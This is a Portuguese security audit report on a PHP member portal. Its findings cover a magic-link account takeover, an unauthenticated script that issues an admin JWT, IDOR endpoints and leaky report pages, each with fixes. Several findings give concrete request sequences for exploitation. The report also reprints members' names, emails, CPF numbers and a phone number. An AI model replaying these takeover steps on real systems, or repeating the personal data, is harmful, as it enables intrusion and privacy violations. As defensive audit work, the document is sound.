# Auditoria de Segurança — Portal do Associado (IDOR / Controle de Acesso / Autenticação)

- **Aplicação:** SINPORG — PHP 8.2 (monolito próprio), XAMPP, workspace C:\xampp\htdocs\app (= http://localhost/app)
- **Escopo:** rotas /portal/* (login, area, logout), Link Mágico (classes/PasswordReset.php), endpoints correlatos que devolvem dados de associado por CPF/id (check_cpf.php, carteirinha_publica.php, completar_perfil.php, api/**/*.php, modulos/portal/*, modulos/associados/*)
- **Método:** análise estática (read/grep) + consultas SQL **somente-leitura** (SELECT/SHOW) via PHP CLI + requisições **HTTP GET** de verificação. Nenhum arquivo de código foi criado, editado ou apagado. O único arquivo produzido é este relatório.
- **Limitação declarada:** não executei requisições que gravam estado (POST de solicitar_magic_link, POST de verificar_token, POST de aprovação de ficha). Esses pontos estão marcados como "confirmado por análise estática / NÃO executado ao vivo" com o motivo.

---

## 1. Sumário executivo

O Portal do Associado **não implementa controle de acesso sobre a identidade do alvo** em nenhum dos seus pontos de entrada. As três falhas estruturais são:

1. O "Link Mágico" é **impresso na própria resposta HTTP** (e não enviado por e-mail), o que transforma o recurso em um **bypass de autenticação**: qualquer pessoa que saiba/conheça o CPF de um associado ativo assume a conta dele sem acesso ao e-mail.
2. A ação **verificar_token não vincula o token a nenhuma identidade de sessão**: não compara o CPF do associado do token com o CPF do usuário logado, não exige que a requisição venha do mesmo navegador que solicitou o link e não regenera o ID de sessão.
3. Endpoints correlatos (inclusive **sem autenticação nenhuma**) devolvem CPF, RG, e-mail, telefone, endereço e situação financeira de **toda a base de associados**, e há IDOR em rotas com ID numérico (por exemplo /associado/{id}/editar e /certificacao/historico/{id}).

Além do escopo pedido, foi encontrado um script de desenvolvimento publicamente acessível que **emite um JWT de administrador** (tmp/bridge_token.php), confirmado ao vivo.

### Tabela de achados

| # | Severidade | Título | Arquivo principal |
|---|-----------|--------|-------------------|
| C-01 | Crítico | Link Mágico exibido na resposta HTTP -> account takeover por CPF | modulos/portal/login.php:166-178 |
| C-02 | Crítico | tmp/bridge_token.php (sem auth) emite JWT de admin | tmp/bridge_token.php:1-17 |
| C-03 | Crítico | Relatórios de associados sem autenticação expõem CPF/RG/e-mail/telefone de toda a base | api/relatorios/lista-associados.php:1-40, api/relatorios/status-associados.php:1-44 |
| A-01 | Alto | IDOR em /associado/{id}/editar — qualquer usuário logado lê PII de qualquer associado | modulos/associados/editar.php:1-32,62 |
| A-02 | Alto | IDOR em /certificacao/historico/{associado_id} | modulos/certificacao/historico.php:8-33 |
| A-03 | Alto | IDOR sem autenticação em api/get_propriedades_associado.php | api/get_propriedades_associado.php:1-23 |
| A-04 | Alto | IDOR sem autenticação em api/get_propriedade_detalhes.php (checagem só roda para nivel==3) | api/get_propriedade_detalhes.php:52-61 |
| A-05 | Alto | Portal copia user_id/user_nivel de qualquer conta usuarios com o mesmo e-mail (e o associado pode trocar o próprio e-mail) | modulos/portal/login.php:133-141,216-224; area.php:77-104 |
| A-06 | Alto | dev-utils/test_api_ficha.php forja sessão e devolve ficha de adesão sem autenticação | dev-utils/test_api_ficha.php:10-34 |
| M-01 | Médio | Scripts de manutenção sem autenticação (check_cpf.php e ~15 outros, incluindo run_sql.php que executa DDL) | check_cpf.php:1-26 e correlatos |
| M-02 | Médio | Token de uso único sem atomicidade, sem vínculo de sessão e sem session_regenerate_id | classes/PasswordReset.php:66-86; login.php:186-234 |
| M-03 | Médio | Bloqueio do portal compara CPF sem normalização (e só cobre 3 ações) | modulos/portal/login.php:54-76 |
| B-01 | Baixo | completar_perfil.php sem proteção CSRF | completar_perfil.php:26-60,121-164 |
| B-02 | Baixo | Portal permite troca de e-mail sem verificação (redireciona o Link Mágico) | modulos/portal/area.php:77-104 |
| I-01 | Info | Validação do token via igualdade no SQL (sem hash_equals) | classes/PasswordReset.php:70-74 |
| I-02 | Info | Cookie de sessão sem HttpOnly/Secure | php.ini (session.cookie_httponly vazio, cookie_secure=0) |
| I-03 | Info | Token do link mágico refletido no HTML a partir do GET (logs/Referer) | modulos/portal/login.php:386 |
| I-04 | Info | UI diz 30 minutos, código expira em 60 | login.php:331 vs PasswordReset.php:49 |
| I-05 | Info | Link de PDF da carteirinha no portal usa ID cru (decodeId falha) | modulos/portal/area.php:209 |

---

## 2. Vulnerabilidades detalhadas

### C-01 (Crítico) — Link Mágico devolvido na resposta HTTP permite assumir qualquer conta de associado

**Arquivo/linha:** modulos/portal/login.php:166-178 (destaque 169 e 173-176); classes/PasswordReset.php:46-59

    $token = $passwordReset->createToken($associado['email']);     // linha 166
    $link = SITE_URL . "/portal/login?etapa=verificar_token&token=" . $token;   // linha 169
    // ...
    $mensagem = "Link mágico gerado! ... <strong>Link para teste:</strong><br>
    <code ...>" . htmlspecialchars($link) . "</code><br><br>
    <a href='" . htmlspecialchars($link) . "' class='btn btn-primary btn-sm'>Acessar Portal (Teste)</a>";  // linhas 173-176

**Prova (fluxo passo a passo, payloads concretos):**

1. Abrir a página para obter cookie de sessão e token CSRF (o token CSRF é emitido para visitantes anônimos — classes/CSRFProtection.php:6-22):

       GET /app/portal/login            -> 200, cookie PHPSESSID + <input name="csrf_token" value="...">

2. Solicitar o link para o CPF da vítima (não é necessário estar logado nem ter acesso ao e-mail):

       POST /app/portal/login
       Content-Type: application/x-www-form-urlencoded
       csrf_token=<token da etapa 1>&acao=solicitar_magic_link&cpf=97748463034

   Resposta (extrato do código, linhas 173-176): HTML contendo
   http://localhost/app/portal/login?etapa=verificar_token&token=<64 hex>

3. Consumir o token:

       POST /app/portal/login
       csrf_token=<token>&acao=verificar_token&token=<64 hex>

4. Resultado: login.php:209-224 grava $_SESSION['associado_id'], associado_nome, associado_cpf, associado_email e redireciona para /portal/area. A sessão passa a ser a da vítima.

**Impacto:** tomada de conta de **qualquer associado ativo** apenas com o CPF (dado semi-público no contexto da associação). Acesso a dados pessoais, financeiro (mensalidades/PIX), carteirinha digital, ficha de adesão, assembleias/votações. Além disso, classes/PasswordReset.php:52 apaga todos os tokens anteriores do mesmo e-mail, então um pedido malicioso **invalida o link legítimo** da vítima (negação de serviço de login).

**Observação importante:** o fluxo equivalente de recuperação de senha do mesmo sistema faz o certo — api/recuperar_senha.php:41-67 cria o token e **envia por e-mail** (Mailer::send), devolvendo apenas mensagem genérica. O vazamento na tela do portal é uma divergência/regressão de implementação, não um requisito de produto.

**Status da verificação:** confirmado por análise estática. **NÃO executado ao vivo** porque o POST grava linha em password_resets (fora do escopo somente-leitura desta auditoria).

**Correção recomendada:**

    // modulos/portal/login.php (substituir o trecho 169-178)
    $token = $passwordReset->createToken($associado['email']);
    $link  = SITE_URL . "/portal/login?etapa=verificar_token&token=" . urlencode($token);

    $html = '<p>Olá, <strong>' . htmlspecialchars($associado['nome']) . '</strong>!</p>'
          . '<p>Use o botão abaixo para acessar sua área. O link expira em 30 minutos e só pode ser usado uma vez.</p>'
          . '<p style="text-align:center"><a href="' . $link . '">Acessar minha área</a></p>';

    $envio = Mailer::send($associado['email'], '[' . SITE_TITLE . '] Acesso ao Portal do Associado', Mailer::layout('Acesso ao Portal', $html));

    // Nunca revelar o link. Mensagem sempre genérica, exista ou não o CPF:
    $mensagem = 'Se o CPF estiver cadastrado e ativo, enviaremos o link de acesso para o e-mail registrado.';
    $mensagem_tipo = 'info';
    $etapa = 'magic_link';
    if (!$envio['success']) {
        error_log('Falha ao enviar magic link para associado ' . (int)$associado['id'] . ': ' . ($envio['error'] ?? ''));
    }

Recomenda-se também: rate limiting por CPF/IP (ex.: 3 pedidos / 15 min) e nunca logar o token em claro.

---

### C-02 (Crítico) — tmp/bridge_token.php acessível sem autenticação emite JWT de administrador

**Arquivo/linha:** tmp/bridge_token.php:1-17

    $env = [];
    foreach (file("C:/xampp/htdocs/app/sinporg/.env", ...) as $l) { ... }   // linha 3
    $seg = $env["JWT_ACCESS_SECRET"];                                      // linha 8
    $payload = [
      'sub' => 7, 'origem' => 'staff', 'nome' => 'Edmilson', 'email' => 'techostin@gmail.com',
      'nivel' => 1, 'tipo' => 'admin', 'certificadoraId' => null, 'associadoId' => null, ...   // linhas 10-14
    ];
    echo $h . '.' . $p . '.' . b64u(hash_hmac('sha256', $h.'.'.$p, $seg, true));   // linha 17

**Prova (confirmada ao vivo, HTTP GET, sem sessão/cookies):**

    GET http://localhost/app/tmp/bridge_token.php
    -> 200
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjcsIm9yaWdlbSI6InN0YWZmIiwibm9tZSI6IkVkbWlsc29uIiwiZW1haWwiOiJ0ZWNob3N0aW5AZ21haWwuY29tIiwibml2ZWwiOjEsInRpcG8iOiJhZG1pbiIsImNlcnRpZmljYWRvcmFJZCI6bnVsbCwiYXNzb2NpYWRvSWQiOm51bGwsImlhdCI6MTc4OTM5MTQyNSwiZXhwIjoxNzg...

O payload decodificado traz nivel=1, tipo=admin e sub=7. O segredo é o JWT_ACCESS_SECRET de produção lido de sinporg/.env.

**Impacto:** bypass total de autenticação/autorização na API Node (sinporg) em nome de um administrador. Também expõe indiretamente a existência e o caminho do arquivo de segredos.

**Correção recomendada:** remover tmp/ do docroot (ou apagar todos os scripts de teste), bloquear por .htaccess e **rotacionar JWT_ACCESS_SECRET** imediatamente (o token emitido é válido enquanto o segredo não mudar). Exemplo de bloqueio no .htaccess da raiz:

    RewriteRule ^(tmp|dev-utils|tools|recicla|producao_bkp|sql|logs)/ - [F,L]
    <FilesMatch "^(check_|debug_|fix_|run_|test_|schema\.php|_tmp_)">
        Require all denied
    </FilesMatch>

---

### C-03 (Crítico) — Endpoints de relatório sem autenticação expõem CPF, RG, e-mail, telefone e situação financeira de todos os associados

**Arquivos/linhas:**
- api/relatorios/lista-associados.php:1-40 — **não há nenhuma verificação de sessão**; a query (linhas 32-40) seleciona a.id, nome_completo, a.email, a.cpf, a.rg, a.telefone, cidade.
- api/relatorios/status-associados.php:1-44 — idem; query (linhas 24-38) traz nome, cpf, telefone, status cadastral, parcelas atrasadas e valor da dívida.
- api/relatorios/inadimplencia.php:12-30 — usa $_GET['filtro_associado_id'] e devolve resumo financeiro sem exigir login.

**Prova (confirmada ao vivo, sem cookies):**

    GET http://localhost/app/api/relatorios/lista-associados.php
    -> 200, 14547 bytes
    <table id="reportTable" ...><thead><tr><th>Nome</th><th>E-mail</th><th>CPF</th><th>RG</th><th>Telefone</th><th>Cidade/UF</th>...

    GET http://localhost/app/api/relatorios/status-associados.php
    -> 200, 18533 bytes; linha de exemplo retornada:
    <tr><td>Edmilson Santos</td><td>476.***.***-87</td><td>51999533615</td><td>Ativo</td>
        <td><span class="badge bg-danger">Inadimplente</span></td><td>2</td><td>R$ 77,00</td></tr>
    (o CPF veio completo e formatado; mascarei parte aqui)

    GET http://localhost/app/api/relatorios/inadimplencia.php?filtro_associado_id=13
    -> 200, conteúdo financeiro ("20 cobranças")

As rotas amigáveis também alcançam os arquivos: index.php:34-45 faz require de api/relatorios/{tipo}.php quando o arquivo existe (ex.: /app/api/relatorios/lista-associados).

**Impacto:** vazamento massivo de dados pessoais (LGPD art. 5º, I e II) e financeiros de toda a base para qualquer visitante anônimo da internet.

**Contraexemplo correto no próprio projeto:** api/relatorios/relatorio_associados.php bloqueia com "Acesso negado. Por favor, faça login..." (verificado ao vivo: 200 com a mensagem de negação).

**Correção recomendada (aplicar no topo de cada arquivo de relatório):**

    require_once __DIR__ . '/../../config/config.php';
    require_once __DIR__ . '/../../classes/User.php';
    $user = new User();
    if (!$user->isLoggedIn() || !$user->hasPermission(NIVEL_GESTOR)) {
        http_response_code(401);
        exit('Acesso não autorizado');
    }

---

### A-01 (Alto) — IDOR em /associado/{id}/editar: qualquer usuário autenticado lê os dados pessoais de qualquer associado

**Arquivos/linhas:**
- index.php:670-674 (rota /associado/{id}/editar; o ID vem numérico da URL)
- modulos/associados/editar.php:1-3 (carrega includes/header.php) e 23:
  $isViewMode = ($_SESSION['user_nivel'] != NIVEL_ADMIN) || isset($_GET['view']);
- modulos/associados/editar.php:13-19 (id da URL), 26 (getById sem validação de dono), 141-195 (renderiza nome, e-mail, CPF, telefone, CEP, endereço)
- includes/header.php:5-11 — **única barreira: estar logado**

**Prova:** a página é aberta em "modo visualização" para qualquer nível diferente de Admin, exibindo os campos do associado alvo:

    GET /app/associado/1/editar        (com cookie de sessão de um usuário nível 3)

Resposta: título "Visualizar Associado" + alerta "Modo de visualização..." (linhas 120-124) e os inputs com os dados do alvo (nome/e-mail/CPF/telefone/CEP/endereço).

O POST é corretamente bloqueado em modo visualização (linha 62), mas a **leitura** não é restringida.

**Verificação ao vivo:** sem sessão, GET http://localhost/app/associado/1/editar redireciona para /app/login (contrateste que confirma que a barreira é apenas "estar logado"). Com sessão de nível 3 a exposição ocorre por análise estática — **não executado ao vivo** por não haver credencial de teste autorizada.

**Impacto:** um associado comum (ou qualquer usuário da tabela usuarios de nível 3) enumera ids 1..N e baixa nome, e-mail, CPF, telefone e endereço de todos os associados.

**Correção recomendada:**

    // modulos/associados/editar.php, logo após instanciar $user (via header.php)
    $nivel = (int)($_SESSION['user_nivel'] ?? NIVEL_USUARIO);
    $meuAssociadoId = (new User())->getAssociadoIdResolvido();
    if (!in_array($nivel, [NIVEL_ADMIN, NIVEL_GESTOR], true) && $meuAssociadoId !== (int)$id) {
        http_response_code(403);
        exit('Acesso negado.');
    }

(Alternativa preferida: manter /meu-perfil para o próprio usuário e exigir NIVEL_GESTOR para o módulo Associados.)

---

### A-02 (Alto) — IDOR em /certificacao/historico/{associado_id}

**Arquivos/linhas:** index.php:96-100 (rota, passa $_GET['associado_id']); modulos/certificacao/historico.php:8-12 (só $user->isLoggedIn()), 14-19 (associado_id vem do GET), 24-33 (busca nome do associado e todas as certificações dele).

**Prova:** qualquer usuário autenticado, sem vínculo com o alvo:

    GET /app/certificacao/historico/13      -> nome do associado 13 + todas as certificações (número, tipo, status, datas, organismo)

**Impacto:** leitura de dados de certificação e identificação (nome) de qualquer associado.

**Correção recomendada:**

    $associadoId = (int)($_GET['associado_id'] ?? 0);
    $meuId = (new User())->getAssociadoIdResolvido();
    if (!in_array((int)$_SESSION['user_nivel'], [NIVEL_ADMIN, NIVEL_GESTOR], true) && $associadoId !== $meuId) {
        http_response_code(403); exit('Acesso negado.');
    }

---

### A-03 (Alto) — IDOR sem autenticação em api/get_propriedades_associado.php

**Arquivo/linha:** api/get_propriedades_associado.php:1-23 — não há session_start, não há checagem de login nem de dono; o $_GET['associado_id'] vai direto para a query (linhas 6 e 15-16).

**Prova (confirmada ao vivo, sem cookies):**

    GET http://localhost/app/api/get_propriedades_associado.php?associado_id=13
    -> 200 [{"id":8,"nome":"Propriedade Teste F3"},{"id":15,"nome":"Propriedade da Família Porto"}]

    GET http://localhost/app/api/get_propriedades_associado.php?associado_id=17
    -> 200 [{"id":19,"nome":"Família Cibulski"},{"id":20,...},{"id":21,...}]

**Impacto:** enumeração dos nomes de propriedades de qualquer produtor por ID (informação de negócio e vínculo pessoal).

**Correção recomendada:** exigir sessão e aplicar a mesma regra de api/get_propriedade_detalhes.php (com a devida correção descrita em A-04).

---

### A-04 (Alto) — IDOR sem autenticação em api/get_propriedade_detalhes.php (checagem só roda quando o nível é exatamente 3)

**Arquivo/linha:** api/get_propriedade_detalhes.php:52-61

    require_once __DIR__ . '/../classes/User.php';
    $userAPI = new User();
    if (isset($_SESSION['user_nivel']) && $_SESSION['user_nivel'] == NIVEL_USUARIO) {   // linha 55
        if ($propriedade['associado_id'] != $userAPI->getAssociadoId()) {
            http_response_code(403); ... exit;
        }
    }

A condição está **invertida em termos de defesa**: quando não existe $_SESSION['user_nivel'] (visitante anônimo, ou sessão apenas do Portal do Associado sem user_id), a checagem é simplesmente ignorada e os dados são retornados.

**Prova (confirmada ao vivo, sem cookies):**

    GET http://localhost/app/api/get_propriedade_detalhes.php?id=8
    -> 200 {"propriedade":{"id":8,"nome":"Propriedade Teste F3","endereco":"Rua teste","cidade":"Afonso Cláudio","estado":"SP",...},"lavouras":[...]}

**Impacto:** leitura de nome, endereço, CEP, coordenadas e observações de qualquer propriedade por ID, por qualquer anônimo.

**Correção recomendada (negar por padrão):**

    $userAPI = new User();
    if (!$userAPI->isLoggedIn()) { http_response_code(401); exit(json_encode(['error'=>'Não autorizado'])); }
    $nivel = (int)($_SESSION['user_nivel'] ?? NIVEL_USUARIO);
    if ($nivel === NIVEL_USUARIO && (int)$propriedade['associado_id'] !== (int)$userAPI->getAssociadoId()) {
        http_response_code(403); exit(json_encode(['error'=>'Acesso negado']));
    }

---

### A-05 (Alto) — O portal transfere privilégios de qualquer conta da tabela usuarios que compartilhe o e-mail, e o associado pode alterar o próprio e-mail

**Arquivos/linhas:**
- modulos/portal/login.php:133-141 (login_cpf) e 216-224 (verificar_token):
      $stmtUser = $db->prepare("SELECT id, nivel FROM usuarios WHERE email = ? AND status = 'ativo' LIMIT 1");
      ...
      $_SESSION['user_id'] = $userVinculado['id'];
      $_SESSION['user_nivel'] = $userVinculado['nivel'];
  Repare que **$_SESSION['user_table'] não é definido** e que o vínculo é feito por **e-mail**, não por associados.user_id.
- classes/User.php:104-114 — hasPermission() confia exclusivamente em $_SESSION['user_nivel'].
- modulos/portal/area.php:77-104 — o associado logado pode gravar livremente o campo email do próprio cadastro (sem reautenticação e sem verificação).
- modulos/associados/meu_perfil.php:185,196-235 — sincroniza dados entre associados e usuarios **casando por e-mail**.

**Prova (estado real do banco, somente leitura):**

    SELECT a.id, a.cpf, a.email, u.id AS usuario_id, u.nivel
    FROM associados a JOIN usuarios u ON u.email = a.email;
    -> 13/47677929087/techostin@gmail.com/7/1
       28/97748463034/roseleiporto@gmail.com/11/3
       29/64049876000/getulio@gmail.com/12/3
       31/21326554879/alderi@gmail.com/14/3

    -- Existem contas nivel 1 ativas em usuarios, ex.: id=110 admin.teste@sinporg.local,
    -- que NÃO pertence a nenhum associado.

**Cadeia de exploração (confirmada por código + dados; NÃO executada ao vivo para não gravar dados):**

1. O atacante entra no portal pela falha C-01 (ou com sua própria conta) e, em /portal/area (aba "Meu Perfil"), altera o próprio e-mail para um endereço de uma conta usuarios de nível 1 que não esteja em uso na tabela associados (ex.: admin.teste@sinporg.local). Não há validação de e-mail nem confirmação (area.php:77-104).
2. Solicita um novo Link Mágico para o próprio CPF. Pela falha C-01 o link é exibido na tela.
3. Ao consumir o token, login.php:216-224 encontra usuarios com aquele e-mail e grava $_SESSION['user_id'] e $_SESSION['user_nivel'] = 1.
4. A partir daí hasPermission(NIVEL_ADMIN) (User.php:104-114) retorna verdadeiro para toda a aplicação — inclusive isDiretoriaExecutiva(), podeAcessarDiretoria() e o menu administrativo.

**Impacto:** escalada de privilégio de associado comum para administrador do sistema. Efeitos colaterais adicionais: como user_table não é definido, User::getCurrentUser() passa a consultar associados com o ID do usuário staff (classes/User.php:214-221), misturando identidades entre as tabelas.

**Correção recomendada:**

    // 1) Nunca derivar privilégio de staff por igualdade de e-mail:
    $_SESSION['user_table'] = 'associados';
    // Não copiar nivel de usuarios. Se for realmente necessário vincular,
    // exigir a associação explícita associados.user_id = usuarios.id:
    $stmtLink = $db->prepare("SELECT u.id, u.nivel FROM usuarios u
                              JOIN associados a ON a.user_id = u.id
                              WHERE a.id = ? AND u.status = 'ativo' LIMIT 1");
    $stmtLink->execute([$associadoId]);
    // e, quando o vínculo existir de fato, manter user_table='usuarios'

    // 2) area.php: só aceitar troca de e-mail com confirmação no endereço novo
    //    (token enviado ao e-mail novo e ao atual) e reautenticação por senha.

    // 3) hasPermission(): ler o nível do banco a cada requisição, em vez de confiar na sessão.

---

### A-06 (Alto) — dev-utils/test_api_ficha.php, acessível sem autenticação, forja sessão e devolve a ficha de adesão

**Arquivo/linha:** dev-utils/test_api_ficha.php:10-34

    error_reporting(E_ALL);
    require_once __DIR__ . '/../config/config.php';
    @session_start();                                     // linha 13
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));  // linha 14
    $cenario = $argv[1] ?? 'status';                      // linha 15
    $aid = 13;                                            // linha 17
    ...
    if ($cenario === 'status') {
        $_SESSION['user_id'] = $aid; $_SESSION['user_table'] = 'associados'; $_SESSION['user_nivel'] = 3;  // linha 29
        $_GET['action'] = 'status';
    }

**Prova (confirmada ao vivo, sem cookies):**

    GET http://localhost/app/dev-utils/test_api_ficha.php
    -> 200 {"success":true,"mostrar":false,"status":"aprovada","ficha":{"id":19,"associado_id":13,
       "numero_cadastro":"AAES-00019","data_entrada":"2026-09-08","nome_completo":"Edmilson Santos",...}

**Risco adicional (NÃO confirmado — não executado por ser operação mutante):** o php.ini local tem register_argc_argv=1, então a query string pode popular $argv[1] e habilitar os cenários "submeter"/"aprovar" (que definem user_nivel = 2, gestor) via ?aprovar, permitindo aprovar fichas de adesão sem autenticação.

**Correção recomendada:** remover dev-utils/ e tmp/ do docroot e bloquear via .htaccess (ver C-02).

---

### M-01 (Médio) — Scripts de manutenção/diagnóstico sem autenticação

**Confirmados ao vivo (HTTP 200 sem sessão):**
- check_cpf.php:1-26 -> corpo: "CPFs duplicados: 0 / Índices no CPF: cpf - cpf - Non_unique: 0"
- check_associados_estado.php -> lista ID, nome, cidade e estado de associados reais
- dev-utils/test_api_ficha.php (ver A-06) e tmp/bridge_token.php (ver C-02)

**Sem qualquer guarda por análise estática (não executados por escreverem estado):** run_sql.php (executa DDL de sql/*.sql), run_seed.php, debug_seed.php, fix_codes.php, update_associados_regiao.php, map_cidades_micro.php, run_full_map.php, add_sigla.php, check_schema.php, schema.php, test_schema.php, test_api_reg.php, test_travar1.php, check_missing.php, check_prefixes.php, _tmp_*.php. Também test_api.php:5, que faz $_SESSION['user_id'] = 1; sem autenticação.

**Impacto:** vazamento de dados cadastrais/estrutura do banco para anônimos e superfície de alteração estrutural não autenticada.

**Correção:** excluir do servidor de produção (ou mover para fora do docroot) e aplicar o bloqueio .htaccess sugerido em C-02.

---

### M-02 (Médio) — Token do Link Mágico: uso não atômico, sem vínculo de sessão e sem regeneração do ID de sessão

**Arquivos/linhas:** classes/PasswordReset.php:66-86; modulos/portal/login.php:186-234

- getValidToken() (PasswordReset.php:66-78) faz SELECT do token e markUsed() (linha 202 em login.php) é chamado **depois**, apenas se o associado for encontrado -> janela TOCTOU: duas requisições POST concorrentes com o mesmo token podem ambas autenticar antes do UPDATE.
- A ação verificar_token (login.php:186-234) não verifica identidade nenhuma: não compara o CPF do associado do token com o CPF do usuário logado, não exige o mesmo navegador que solicitou o link e não invalida a sessão anterior.
- O bloco de bloqueio por CPF (login.php:54-76) cobre apenas consultar_cpf, login_cpf e solicitar_magic_link; **verificar_token não é coberto**. Assim, um usuário logado como pessoa A (sessão principal, sem sessão de portal) pode submeter o token de B e passar a operar como B.
- Nenhuma ocorrência de session_regenerate_id() em todo o código (grep) e o php.ini local tem session.use_strict_mode=0 -> fixação de sessão viável.
- Divergência de documentação: a UI informa 30 minutos (login.php:331) mas o código define 3.600 s (PasswordReset.php:49).

**Prova (fluxo):** obter o token de B por C-01 e, em uma sessão autenticada como A (sem associado_id na sessão), executar:

    POST /app/portal/login
    csrf_token=<token da sessão A>&acao=verificar_token&token=<token de B>
    -> 302 /portal/area, e a sessão passa a ser de B

**Status:** confirmado por análise estática (o POST grava used=1; não executado por restrição de somente-leitura).

**Correção recomendada:**

    // 1) Consumo atômico em classes/PasswordReset.php
    public function consumeToken(string $token): array|false {
        if ($token === '') return false;
        $hash = hash('sha256', $token);
        $stmt = $this->db->prepare("UPDATE password_resets SET used = 1
                                    WHERE token_hash = ? AND used = 0 AND expires_at > NOW()");
        $stmt->execute([$hash]);
        if ($stmt->rowCount() !== 1) return false;      // já usado/expirado/inexistente
        $stmt = $this->db->prepare("SELECT * FROM password_resets WHERE token_hash = ? LIMIT 1");
        $stmt->execute([$hash]);
        return $stmt->fetch(PDO::FETCH_ASSOC) ?: false;
    }

    // 2) Amarrar o token a quem pediu (gravar na sessão ao solicitar e conferir ao validar)
    $_SESSION['magic_link_pendente'] = ['email' => $associado['email'], 'hash' => hash('sha256', $token), 'ts' => time()];
    // na validação: if (empty($_SESSION['magic_link_pendente']) || $_SESSION['magic_link_pendente']['hash'] !== hash('sha256', $token)) { recusar; }

    // 3) Regenerar a sessão em toda troca de identidade
    session_regenerate_id(true);
    // e ligar session.use_strict_mode=1, session.cookie_httponly=1

    // 4) Corrigir o texto da UI para o tempo real de expiração (ou reduzir para 30 min no código)

---

### M-03 (Médio) — O bloqueio por CPF do portal compara valores sem normalização e cobre apenas três ações

**Arquivo/linha:** modulos/portal/login.php:54-76

    if ($user->isLoggedIn() && !$isAdminOrDiretoriaExecutiva) {                       // linha 55
        if ($acao === 'consultar_cpf') $cpfAlvo = preg_replace('/\D/', '', $_POST['cpf_consulta'] ?? '');   // 57
        elseif ($acao === 'login_cpf') $cpfAlvo = preg_replace('/\D/', '', $_POST['cpf'] ?? '');            // 58
        elseif ($acao === 'solicitar_magic_link') $cpfAlvo = preg_replace('/\D/', '', $_POST['cpf'] ?? ''); // 59
        if (!empty($cpfAlvo)) {
            $stmtMeu = $db->prepare("SELECT cpf FROM associados WHERE id = ?");    // linha 65
            ...
            $meuCpf = $stmtMeu->fetchColumn();                                     // linha 67 (valor CRU)
            if (!$meuCpf || $meuCpf !== $cpfAlvo) { ... $acao = 'bloqueado'; }     // linha 70 (comparação estrita)
        }
    }

**Problemas objetivos:**

1. **Falta de normalização nos dois lados.** A entrada é normalizada com preg_replace('/\D/','') mas o valor do banco é usado cru. O schema é cpf varchar(14) (aceita máscara) e o formulário de edição usa placeholder mascarado (modulos/associados/editar.php:157-161). Basta um CPF gravado como "476.779.290-87" (ou com zero à esquerda perdido) para que o dono legítimo seja sistematicamente bloqueado com "Você só tem permissão para acessar os seus próprios dados exclusivos." Na base atual há um registro fora do padrão de 11 dígitos: id 20 -> "3689160604" (10 dígitos), que será sempre bloqueado.
2. **Cobertura parcial.** Só 3 ações passam pela checagem; verificar_token fica fora (ver M-02). Além disso, a checagem só existe para usuários já logados no sistema ($user->isLoggedIn()), e a decisão de privilégio ($isAdminOrDiretoriaExecutiva) considera qualquer cargo executivo em **qualquer** associação (classes/User.php:365-387). Hoje: associados 21 (presidente), 31 (diretor) e 67 (diretor) passam pelo caminho privilegiado.

**Correção recomendada:** normalizar os dois lados e centralizar a decisão em um único helper:

    $normalizaCpf = fn($v) => preg_replace('/\D/', '', (string)$v);

    $meuCpf = $normalizaCpf($meuCpf);            // normalizar SEMPRE
    if ($meuCpf === '' || !hash_equals($meuCpf, $normalizaCpf($cpfAlvo))) { bloquear(); }

E aplicar a checagem também a verificar_token (comparando $reset['cpf'] com o CPF da sessão quando ela existir).

---

### B-01 (Baixo) — completar_perfil.php sem proteção CSRF

**Arquivo/linha:** completar_perfil.php:26-60 (processa POST de atualização de perfil) e 121-164 (formulário sem CSRFProtection::getTokenField()). O arquivo não inclui classes/CSRFProtection.php.

**Impacto:** alteração de orgao/setor/especialidade/nicho/tipo_usuario do usuário vítima via CSRF (impacto limitado, mas altera o roteamento de dashboards e permissões de módulo).

**Correção:**

    require_once __DIR__ . '/classes/CSRFProtection.php';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !CSRFProtection::validatePostRequest()) {
        http_response_code(403); exit('Token CSRF inválido.');
    }
    // e adicionar <?php echo CSRFProtection::getTokenField(); ?> no formulário

---

### B-02 (Baixo) — O portal permite troca de e-mail sem verificação

**Arquivo/linha:** modulos/portal/area.php:77-104 (o array de atualização inclui 'email' => trim($_POST['email']) e o UPDATE grava direto, sem reautenticação/verificação).

**Impacto:** como o Link Mágico é emitido por CPF e vinculado ao **e-mail atual** (login.php:159,166), controlar a sessão do portal e trocar o e-mail desloca o fator de autenticação para um endereço do atacante (persistência de acesso) e alimenta a cadeia A-05. Também permite capturar um endereço de e-mail de terceiro que ainda não seja associado (não há verificação de posse).

**Correção:** exigir senha atual para alterar e-mail, enviar confirmação para o e-mail antigo e o novo (double opt-in) e registrar auditoria persistente.

---

### Achados informativos

- **I-01** classes/PasswordReset.php:70-74 — a comparação do token é feita por igualdade textual no SQL. Como o valor pesquisado é o SHA-256 do token e existe índice (idx_token), não há ataque de timing prático; ainda assim, o padrão recomendado é buscar pelo hash e comparar com hash_equals().
- **I-02** php.ini local: session.cookie_httponly vazio e session.cookie_secure=0. O cookie de sessão é legível por JavaScript e trafega em HTTP simples, ampliando o impacto de qualquer XSS e permitindo captura em rede.
- **I-03** modulos/portal/login.php:386 — o token do link mágico, recebido por GET, é refletido no HTML do formulário (linhas 376-393). Tokens em query string ficam registrados em logs de acesso, histórico e cabeçalho Referer.
- **I-04** login.php:331 informa "expira em 30 minutos", mas PasswordReset.php:49 define 3.600 s (60 min).
- **I-05** modulos/portal/area.php:209-210 gera o link de PDF como /associado/{id}/carteirinha-pdf com o **ID cru**. A rota passa por decodeId() (index.php:641), que exige pelo menos 16 bytes e devolve 0 para "13": o botão do portal está quebrado e a inconsistência (usar ID cru num fluxo que espera ID cifrado) sugere que outros pontos podem ter sido escritos esperando ID cru — vale revisar caso a caso.

---

## 3. Estado atual do controle de acesso em modulos/portal/login.php

### 3.1 O que o código já faz hoje

**Bloco 47-249 (processamento de POST):**

| Linhas | Comportamento atual |
|--------|--------------------|
| 47-50 | Exige POST + CSRFProtection::validatePostRequest(). **Porém o token CSRF é emitido a visitantes anônimos** (CSRFProtection::generateToken cria e grava na sessão; os formulários em 300/323/349 imprimem o campo). Logo, o CSRF não é barreira para um atacante: ele primeiro faz GET /portal/login e recebe cookie + token. |
| 33-37 | Calcula $isAdminOrDiretoriaExecutiva = hasPermission(NIVEL_ADMIN) || isDiretoriaExecutiva(). isDiretoriaExecutiva() (User.php:365-387) considera cargo executivo em **qualquer** associação — hoje há presidente/diretor nos associados 21, 31 e 67. |
